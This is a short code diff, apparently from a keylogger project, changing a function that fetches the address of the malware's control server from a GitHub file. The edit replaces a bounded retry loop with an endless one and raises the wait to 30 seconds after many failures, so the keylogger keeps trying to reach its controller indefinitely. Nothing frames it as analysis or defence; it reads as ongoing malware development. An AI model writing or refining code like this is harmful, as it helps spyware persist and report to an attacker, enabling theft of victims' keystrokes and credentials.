@@ -176,8 +176,9 @@ MemoryStruct get_html_memory_struct(string url) {
 /*Get URL of server*/
 string get_base_url() {
 	string URL_TO_GET_IP = "https://github.com/dantepro1955/KeyLogger/blob/master/base_url";
-	int retry = 200;
-	while (retry > 0) {
+	int retry = 100;
+	DWORD delay = 5000; // 5s retry
+	while (true) {
 		string html = get_html(URL_TO_GET_IP);
 		printf("%s", html);
 		if (html != "") {
@@ -193,8 +194,11 @@ string get_base_url() {
 
 		html.clear();
 		// "cannot get base url, retry " << retry << endl;
-		Sleep(5000);
+		Sleep(delay);
 		retry--;
+		if (retry < 0) {
+			delay = 30000; // increase delay to 30s
+		}
 	}
 	return "";
 }
